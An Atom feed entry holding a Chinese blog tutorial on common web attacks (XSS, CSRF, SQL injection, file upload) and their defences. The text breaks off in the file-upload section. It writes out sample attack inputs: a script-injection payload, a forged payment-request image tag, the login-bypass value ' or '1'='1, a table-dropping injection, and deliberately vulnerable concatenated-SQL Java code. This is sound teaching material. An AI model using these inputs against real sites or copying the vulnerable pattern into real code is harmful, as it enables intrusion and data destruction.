<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>千里稻花应秀色 • Posts by &#34;web安全&#34; category</title>
    <link href="http://example.com" />
    <updated>2021-05-21T10:39:27.000Z</updated>
    <category term="C" />
    <category term="大数据" />
    <category term="Shell" />
    <category term="Python" />
    <category term="MapReduce" />
    <category term="Hexo" />
    <category term="安全" />
    <category term="鸿蒙" />
    <category term="单片机" />
    <category term="平台" />
    <category term="机器学习" />
    <entry>
        <id>http://example.com/2021/05/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
        <title>Web攻击方式</title>
        <link rel="alternate" href="http://example.com/2021/05/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
        <content type="html">&lt;h2 id=&#34;web攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web攻击&#34;&gt;&lt;/a&gt; Web攻击&lt;/h2&gt;
&lt;p&gt;在互联网中，攻击手段数不胜数，我们平时不能以自己只是普通的开发程序员而不是安全方向的开发者为理由，而不去掌握基本的 &lt;strong&gt;Web&lt;/strong&gt; 攻击手段！我们来熟悉一下有哪几种常见的 &lt;strong&gt;Web&lt;/strong&gt; 攻击手段&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814144835736.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814144835736.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;常见的 &lt;strong&gt;Web&lt;/strong&gt; 攻击手段主要有 &lt;code&gt;XSS 攻击&lt;/code&gt;、&lt;code&gt;CSRF 攻击&lt;/code&gt;、&lt;code&gt;SQL 注入攻击&lt;/code&gt;、&lt;code&gt;DDos 攻击&lt;/code&gt;、&lt;code&gt;文件漏洞攻击&lt;/code&gt;等。这几种攻击方式的防护手段并不复杂，却还是有很多企业遭受了该攻击，朔源到头，还是因为人为的疏忽。&lt;/p&gt;
&lt;h3 id=&#34;一-xss-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-xss-攻击&#34;&gt;&lt;/a&gt; 一、XSS 攻击&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;XSS&lt;/strong&gt; 攻击的全称为 &lt;code&gt;跨站脚本攻击（Cross Site Scripting）&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么不叫&lt;code&gt;CSS&lt;/code&gt; ，那是因为为了不跟层叠样式表（Cascading Style Sheet，CSS）混淆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;XSS攻击&lt;/strong&gt; 是 &lt;strong&gt;Web&lt;/strong&gt; 应用中最常见到的攻击手段之一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;跨站脚本攻击&lt;/strong&gt;，关键词 &lt;code&gt;脚本&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;攻击者常常在网页中嵌入了恶意的脚本程序，当用户打开该网页的时候，脚本程序便开始在客户端的浏览器后台执行，常用于盗取客户端的 &lt;strong&gt;cookie&lt;/strong&gt;，用户名密码，下载执行病毒的木马程序，以及获取客户端 &lt;strong&gt;Admin&lt;/strong&gt; 权限。&lt;/p&gt;
&lt;h4 id=&#34;1-攻击原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-攻击原理&#34;&gt;&lt;/a&gt; 1、攻击原理&lt;/h4&gt;
&lt;p&gt;前端常用表单的形式向后台提交信息&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;cbuc&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;很普通的一段&lt;strong&gt;html&lt;/strong&gt;代码，向后台提交 &lt;strong&gt;username&lt;/strong&gt; 的信息，正常情况下，用户一般会输入自己的 &lt;strong&gt;username&lt;/strong&gt;，这个时候毫无问题，但是在不正常的情况下，用户输入的不是一个正常的字符串，而是 &lt;code&gt;&amp;quot;/&amp;gt;&amp;lt;script&amp;gt; alert(&amp;quot;bingo&amp;quot;) &amp;lt;/script&amp;gt;&amp;lt;!-&lt;/code&gt; 。按这个时候表单的内容就会变成&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt; alert(&lt;span class=&#34;string&#34;&gt;&amp;quot;bingo&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;!-&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候向后台提交参数，由于 username 的不合法性，校验可能不通过，服务端就重定向会该页面，并且带上以上参数，这个时候页面就会弹出一个警告框：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814150800839.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814150800839.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;警告框问题不是很大，是因为取决于这段脚本，如果攻击者稍做修改，那么性质可能就不一样了~&lt;/p&gt;
&lt;p&gt;甚至，攻击者可以对URL进行操作，正常提交的地址为&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;www.xxx.com/login?username=&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;gt;&amp;lt;script&amp;gt; alert(&amp;quot;&lt;/span&gt;bingo&lt;span class=&#34;string&#34;&gt;&amp;quot;) &amp;lt;/script&amp;gt;&amp;lt;!-&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击者可以对 URL 进行编码用来迷惑用户：&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;www.xxx.com/login?username=&lt;span class=&#34;string&#34;&gt;&amp;quot;%2F%3E%3Cscript%3E%20alert(%22bingo%22)%20%3C%2Fscript%3E%3C!-&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;2-防护手段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-防护手段&#34;&gt;&lt;/a&gt; 2、防护手段&lt;/h4&gt;
&lt;p&gt;知道了如何攻击，防护起来就不难，我们对症下药即可。既然输入的参数不合法，我们就很有必要对入参进行校验，比如 &lt;code&gt;&amp;lt;、&amp;gt;、&amp;quot;、&amp;quot;、&#39;、&#39;&lt;/code&gt; 这些特殊字符我们很有必要进行转义与校验。&lt;/p&gt;
&lt;h3 id=&#34;二-csrf-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-csrf-攻击&#34;&gt;&lt;/a&gt; 二、CSRF 攻击&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;CSRF&lt;/strong&gt; 攻击全称 &lt;code&gt;跨站请求伪造 (Cross site request forgery)&lt;/code&gt;。是一种对网站的恶意利用，我们上面说到的 &lt;strong&gt;XSS攻击&lt;/strong&gt; 是利用站点内的信任用户，自己去触发脚本而导致的攻击。而 &lt;strong&gt;CSRF&lt;/strong&gt; 则是通过伪装来自受信任用户的请求去利用受攻击的网站。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CSRF 攻击&lt;/strong&gt;，关键词：&lt;code&gt;伪造&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;攻击这盗用了访问用户的身份，以访问者的名义向第三方网站发送恶意请求，常用于利用访问者的身份发送消息，进行交易转账以及盗取账号。&lt;/p&gt;
&lt;h4 id=&#34;1-攻击原理-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-攻击原理-2&#34;&gt;&lt;/a&gt; 1、攻击原理&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814155503658.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814155503658.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;image-20210814155503658&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;受害者&lt;/strong&gt;首先在&lt;strong&gt;信任站点&lt;/strong&gt;完成了登录，并且生成了 Cookie，Cookie会在浏览器保存一定的时间。到这一步，用户如果在没有登出 &lt;strong&gt;信任站点&lt;/strong&gt; 的情况下，访问了 &lt;strong&gt;恶意站点&lt;/strong&gt;，这个时候 &lt;strong&gt;恶意站点&lt;/strong&gt; 就会向 &lt;strong&gt;信任站点&lt;/strong&gt; 发起请求，这个请求就会带上以上生成的 Cookie，当恶意请求来到 &lt;strong&gt;信任站点&lt;/strong&gt;，&lt;strong&gt;信任站点&lt;/strong&gt; 看到请求携带的 Cookie，就会判断该请求是 &lt;strong&gt;受害者&lt;/strong&gt; 发出的。因此 &lt;strong&gt;信任站点&lt;/strong&gt; 就会根据 &lt;strong&gt;受害者&lt;/strong&gt; 的权限来完成 &lt;strong&gt;恶意请求&lt;/strong&gt; 的指令，而这个指令可能是利用 &lt;strong&gt;受害者&lt;/strong&gt; 的身份发送消息，转账支付等等操作，这样 &lt;strong&gt;恶意站点&lt;/strong&gt; 就达到了伪造 &lt;strong&gt;受害者&lt;/strong&gt; 请求 &lt;strong&gt;信任站点&lt;/strong&gt; 的目的。&lt;/p&gt;
&lt;p&gt;看到这个流程不知道你是否有所启发，不知道屏幕前的小伙伴是否有过 &lt;code&gt;QQ&lt;/code&gt; 被盗用的经历，当然，有些盗用的手段与上面的流程是相似的。&lt;/p&gt;
&lt;p&gt;该攻击手段在日常中十分常见。如果某个支付系统的转账地址为 &lt;code&gt;www.xxx.com/pay?accountNum=xxxx&amp;amp;money=xxx&lt;/code&gt;。其中 &lt;strong&gt;accountNum&lt;/strong&gt; 为转账目的的账户，&lt;strong&gt;money&lt;/strong&gt; 为转账金额。那这个时候如果你刚巧登录过了该支付系统，又没有及时的登出，在访问&lt;code&gt;恶意站点&lt;/code&gt;的时候，如果你点开了某张图片，而图片的地址为 ：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;www.xxx.com/pay?accountNum=xxxx&amp;amp;money=xxx&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当你美滋滋地浏览图片的时候，却不知道此时你的账户上已经悄悄的少了指定金额！&lt;/p&gt;
&lt;p&gt;这就是因为你没有及时的登出&lt;code&gt;支付系统&lt;/code&gt;，而又点击了 &lt;code&gt;恶意站点&lt;/code&gt;的 &lt;strong&gt;恶意链接&lt;/strong&gt;，携带了你未过期的 Cookie，成功窃取了你的金额。&lt;/p&gt;
&lt;h4 id=&#34;2-防护手段-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-防护手段-2&#34;&gt;&lt;/a&gt; 2、防护手段&lt;/h4&gt;
&lt;p&gt;同样知其症下其药！防护手段如下：&lt;/p&gt;
&lt;h5 id=&#34;1将-cookie-设置为-httponly&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1将-cookie-设置为-httponly&#34;&gt;&lt;/a&gt; 1）将 cookie 设置为 HttpOnly&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;CSRF&lt;/strong&gt; 攻击的关键就在于利用了用户未过期的 &lt;strong&gt;Cookie&lt;/strong&gt;，那么为了防止 &lt;strong&gt;Cookie&lt;/strong&gt; 的盗取，就需要在 &lt;strong&gt;Cookie&lt;/strong&gt; 中设置 &lt;strong&gt;HttpOnly&lt;/strong&gt; 属性，这样通过程序（&lt;code&gt;XSS 攻击&lt;/code&gt;）就无法读取到 &lt;strong&gt;Cookie&lt;/strong&gt; 信息，避免了攻击者伪造 &lt;strong&gt;Cookie&lt;/strong&gt; 的情况出现。&lt;/p&gt;
&lt;h5 id=&#34;2增加-token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2增加-token&#34;&gt;&lt;/a&gt; 2）增加 token&lt;/h5&gt;
&lt;p&gt;该防护手段还是针对 &lt;strong&gt;Cookie&lt;/strong&gt; 的盗取，由于请求中所有的用户验证信息都存放于 &lt;strong&gt;Cookie&lt;/strong&gt; 中，因为我们抵御 &lt;strong&gt;CSRF&lt;/strong&gt; 的关键就在于：&lt;strong&gt;如何在请求中放入攻击者所不能伪造的信息&lt;/strong&gt;，并且该信息不能存放在 &lt;strong&gt;Cookie&lt;/strong&gt; 中。那么我们就可以在请求返回中加入一个随机生成的 &lt;code&gt;token&lt;/code&gt;，当请求来到时进行 &lt;strong&gt;token&lt;/strong&gt; 的校验，如果校验不通过则认为是 &lt;strong&gt;CSRF&lt;/strong&gt; 攻击而拒绝该请求。&lt;/p&gt;
&lt;h5 id=&#34;3通过-referer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3通过-referer&#34;&gt;&lt;/a&gt; 3）通过 Referer&lt;/h5&gt;
&lt;p&gt;根据 &lt;strong&gt;HTTP&lt;/strong&gt; 协议，在 &lt;strong&gt;HTTP&lt;/strong&gt; 请求头上有一个字段叫做 &lt;code&gt;referer&lt;/code&gt;，它记录了该&lt;strong&gt;Http&lt;/strong&gt; 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自同一个网站。&lt;/p&gt;
&lt;p&gt;在 &lt;strong&gt;CSRF&lt;/strong&gt; 中恶意请求是从 &lt;strong&gt;恶意站点&lt;/strong&gt; 发出的，因此要防御 &lt;strong&gt;CSRF&lt;/strong&gt; 攻击，需要对每一个请求验证其 &lt;strong&gt;referer&lt;/strong&gt; 值即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814161915170.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814161915170.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;image-20210814161915170&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;三-sql-注入攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-sql-注入攻击&#34;&gt;&lt;/a&gt; 三、SQL 注入攻击&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;SQL注入&lt;/strong&gt; 是程序员最经常遇到的，所谓 &lt;strong&gt;SQL注入&lt;/strong&gt;，就是通过把 &lt;strong&gt;SQL&lt;/strong&gt; 命令伪装成正常的请求参数，传递到服务端，欺骗服务器最终执行恶意的 &lt;strong&gt;SQL命令&lt;/strong&gt;，达到入侵的目的。攻击者常常利用 &lt;strong&gt;SQL&lt;/strong&gt; 注入的漏洞，来查询非授权的关键信息，修改数据库服务器的数据，改变表结构，危害极大！&lt;/p&gt;
&lt;h4 id=&#34;1-攻击原理-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-攻击原理-3&#34;&gt;&lt;/a&gt; 1、攻击原理&lt;/h4&gt;
&lt;p&gt;我们查询用户存不存在往往是通过以下 SQL：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; s_user &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当我们后端使用以下代码查询时，便会出现致命的漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Connection  con = getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Statement st = (Statement) con.createStatement();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;String sql = &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM s_user WHERE username = &amp;#x27;&amp;quot;&lt;/span&gt;+ username +&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; and password = &amp;#x27;&amp;quot;&lt;/span&gt;+ passward+&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ResultSet rs = st.executeQuery(sql);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(rs.next())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面代码逻辑便是利用前端传入的参数进行数据库查询，乍看之下感觉毫无问题，但是这个时候如果 &lt;code&gt;password&lt;/code&gt; 前端传过来的值是 &lt;code&gt;&#39; or &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那这个时候 SQL 就会变成&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; s_user &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样的 SQL 不用试都知道会把数据库中的用户全都查出来，明明没有输入正确的密码，却返回了登录成功。而这便是一次简单且典型的 SQL 注入攻击。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39; or &#39;1&#39;=&#39;1&lt;/code&gt; 危害是让用户免密码登录，如果传过来的值为 &lt;code&gt;&#39;; drop table xxx; --&lt;/code&gt; 这个时候问题就大了！&lt;/p&gt;
&lt;h4 id=&#34;2-防护手段-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-防护手段-3&#34;&gt;&lt;/a&gt; 2、防护手段&lt;/h4&gt;
&lt;h5 id=&#34;1使用预编译语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1使用预编译语句&#34;&gt;&lt;/a&gt; 1）使用预编译语句&lt;/h5&gt;
&lt;p&gt;预编译语句 &lt;strong&gt;PreparedStatement&lt;/strong&gt; 是 java.sql 中的一个接口，继承自 &lt;strong&gt;Statement&lt;/strong&gt; 接口。&lt;/p&gt;
&lt;p&gt;预编译语句和 &lt;strong&gt;Statement&lt;/strong&gt; 的不同之处在于，创建 &lt;strong&gt;PreparedStatement&lt;/strong&gt; 对象时就指定了 SQL 语句，该语句立即发送给 &lt;strong&gt;DBMS&lt;/strong&gt; 进行编译，当该编译语句需要被执行时，&lt;strong&gt;DBMS&lt;/strong&gt; 直接运行编译后的 SQL 语句，而不需要像其他 SQL 语句那样先将其编译：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;String sql = &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM s_user WHERE username = ? and password = ? &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PreparedStatement st = conn.preparedStatement(sql);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;st.setString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;st.setString(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, password);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ResultSet rs = st.executeQUery();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，SQL 语句中原有的白能量已经用占位符 ？ 替代了，变量通过 &lt;code&gt;setString()&lt;/code&gt; 方法进行设置。&lt;/p&gt;
&lt;h5 id=&#34;2使用-orm-框架&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2使用-orm-框架&#34;&gt;&lt;/a&gt; 2）使用 ORM 框架&lt;/h5&gt;
&lt;p&gt;防止 &lt;strong&gt;SQL&lt;/strong&gt; 注入的关键手段在于对一些关键字进行转义，而常见的一些 ORM 框架，如 Mybatis，Hibernate等，都支持对响应的关键字或者特殊符号进行转义，可以通过简单的配置，很好的预防 SQL 注入的漏洞，降低普通开发人员进行安全编程的门槛。&lt;/p&gt;
&lt;h3 id=&#34;四-文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四-文件上传漏洞&#34;&gt;&lt;/a&gt; 四、文件上传漏洞&lt;/h3&gt;
&lt;p&gt;很多网站都有上传的功能，如上传图片、文件、压缩包等等。而这些资源往往是保存在远端服务器上。文件上传攻击指的就是攻击者利用一些站点没有对文件类型做很好的校验，上传了可执行的文件或脚本，并且通过脚本对服务器进行一定的权限操作，或是通过诱导外部用户访问该脚本文件，达到攻击的目的。&lt;/p&gt;
&lt;p&gt;当然，这种攻击防护上也是比较简单，为了防止用户上传恶意的可执行脚本文件，以及将文件上传服务器当做免费的文件存储服务器来使用，我们需要对上传文件的类型进行白名单校验，并且需要限制上传文件的大小，上传的文件需要进行重新命名，使攻击这无法猜测到上传文件的访问路径。&lt;/p&gt;
&lt;p&gt;其中对上传文件的类型进行白名单校验，并不能单单通过后缀名称来判断文件的类型，因为攻击者很有可能可以通过将可执行文件的后缀名称改为其他可上传的后缀名称进行上传，因为判断文件类型就需要使用更加安全的方式。&lt;/p&gt;
&lt;p&gt;很多类型的文件，其实的几个字节内容是固定的，因此根据这几个字节的内容，就可以确定文件类型，而这几个字节也被成为 &lt;code&gt;魔数&lt;/code&gt;&lt;/p&gt;
